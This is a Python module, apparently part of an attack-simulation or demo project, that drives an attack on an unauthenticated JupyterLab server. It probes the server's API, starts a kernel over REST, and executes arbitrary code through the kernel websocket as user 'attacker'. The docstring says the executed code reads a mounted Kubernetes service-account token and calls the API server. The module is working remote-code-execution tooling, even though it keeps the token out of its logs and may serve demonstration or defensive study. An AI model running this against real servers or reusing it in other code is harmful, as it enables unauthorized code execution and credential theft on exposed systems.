"""Drive the compromised notebook through the real Jupyter kernel API.

This is how the attack actually runs now: instead of the backend using a
Kubernetes client, it reaches the unauthenticated JupyterLab exposed on the
tailnet (ShadowRay-style), creates a kernel over the REST API, and executes
Python in that kernel over its websocket — exactly what a real attacker with a
leaked notebook URL would do. Everything the kernel then does (reading the
mounted service-account token, calling the API server) runs *inside the pod*.

We never print the token itself; callers only surface its length and a short
hash. HTTP requests are recorded without Authorization headers.
"""
from __future__ import annotations

import json
import time
import urllib.request
import uuid
from typing import Callable, Optional

import websocket  # websocket-client (already a dependency of the kubernetes client)

from . import config

# Transcript emitter signature: emit(kind, text, **extra)
Emit = Callable[..., None]


def base_http() -> str:
    return config.JUPYTER_URL.rstrip("/")


def base_ws() -> str:
    return base_http().replace("https://", "wss://").replace("http://", "ws://")


def _http(method: str, path: str, body: Optional[dict] = None, timeout: float = 10.0) -> tuple[int, dict]:
    url = base_http() + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        raw = r.read().decode() or "{}"
        try:
            return r.status, json.loads(raw)
        except json.JSONDecodeError:
            return r.status, {"raw": raw}


# ---------------------------------------------------------------------------
# Reachability / recon
# ---------------------------------------------------------------------------
def probe(emit: Emit | None = None) -> dict:
    """GET /api on the exposed Jupyter. Returns {reachable, version, url}."""
    try:
        status, payload = _http("GET", "/api", timeout=8)
        version = payload.get("version", "?")
        if emit:
            emit("http", f"GET {base_http()}/api -> {status} (JupyterLab {version})",
                 method="GET", url=f"{base_http()}/api", status=status)
        return {"reachable": True, "version": version, "url": base_http()}
    except Exception as e:  # noqa: BLE001
        if emit:
            emit("http", f"GET {base_http()}/api -> unreachable ({e})",
                 method="GET", url=f"{base_http()}/api", status=0)
        return {"reachable": False, "version": None, "url": base_http(), "error": str(e)}


# ---------------------------------------------------------------------------
# Kernel lifecycle
# ---------------------------------------------------------------------------
def start_kernel(emit: Emit | None = None) -> str:
    status, payload = _http("POST", "/api/kernels", body={"name": "python3"}, timeout=30)
    kid = payload.get("id", "")
    if emit:
        emit("http", f"POST {base_http()}/api/kernels -> {status} (kernel {kid[:8]}…)",
             method="POST", url=f"{base_http()}/api/kernels", status=status)
    if not kid:
        raise RuntimeError(f"Jupyter did not return a kernel id: {payload}")
    return kid


def stop_kernel(kernel_id: str) -> None:
    try:
        _http("DELETE", f"/api/kernels/{kernel_id}", timeout=10)
    except Exception:  # noqa: BLE001
        pass


def list_kernels() -> list[dict]:
    try:
        _s, payload = _http("GET", "/api/kernels", timeout=8)
        return payload if isinstance(payload, list) else []
    except Exception:  # noqa: BLE001
        return []


# ---------------------------------------------------------------------------
# Execute code in a kernel over the websocket (Jupyter messaging protocol v5.3)
# ---------------------------------------------------------------------------
def _msg(session: str, code: str) -> dict:
    mid = uuid.uuid4().hex
    return {
        "header": {
            "msg_id": mid,
            "username": "attacker",
            "session": session,
            "msg_type": "execute_request",
            "version": "5.3",
            "date": "",
        },
        "parent_header": {},
        "metadata": {},
        "content": {
            "code": code,
            "silent": False,
            "store_history": True,
            "user_expressions": {},
            "allow_stdin": False,
            "stop_on_error": True,
        },
        "channel": "shell",
        "buffers": [],
    }


def run_code(kernel_id: str, code: str, emit: Emit | None = None, timeout: float = 90.0) -> str:
    """Execute code in the kernel over its websocket; return combined output.

    Records the code sent and the real output through `emit` if provided.
    """
    session = uuid.uuid4().hex
    ws_url = f"{base_ws()}/api/kernels/{kernel_id}/channels?session_id={session}"
    if emit:
        emit("code", code)
    ws = websocket.create_connection(ws_url, timeout=timeout, suppress_origin=True)
    out_parts: list[str] = []
    try:
        req = _msg(session, code)
        parent_id = req["header"]["msg_id"]
        ws.send(json.dumps(req))
        ws.settimeout(timeout)
        got_reply = False
        idle = False
        deadline = time.time() + timeout
        while time.time() < deadline and not (got_reply and idle):
            try:
                raw = ws.recv()
            except websocket.WebSocketTimeoutException:
                break
            if not raw:
                continue
            m = json.loads(raw)
            if m.get("parent_header", {}).get("msg_id") != parent_id:
                continue
            mt = m.get("msg_type") or m.get("header", {}).get("msg_type")
            content = m.get("content", {})
            if mt == "stream":
                out_parts.append(content.get("text", ""))
            elif mt == "execute_result":
                out_parts.append(content.get("data", {}).get("text/plain", ""))
            elif mt == "display_data":
                out_parts.append(content.get("data", {}).get("text/plain", ""))
            elif mt == "error":
                tb = "\n".join(content.get("traceback", []))
                out_parts.append(f"{content.get('ename','Error')}: {content.get('evalue','')}\n{tb}")
            elif mt == "status" and content.get("execution_state") == "idle":
                idle = True
            elif mt == "execute_reply":
                got_reply = True
    finally:
        ws.close()
    output = "".join(out_parts).strip()
    if emit and output:
        emit("output", output)
    return output
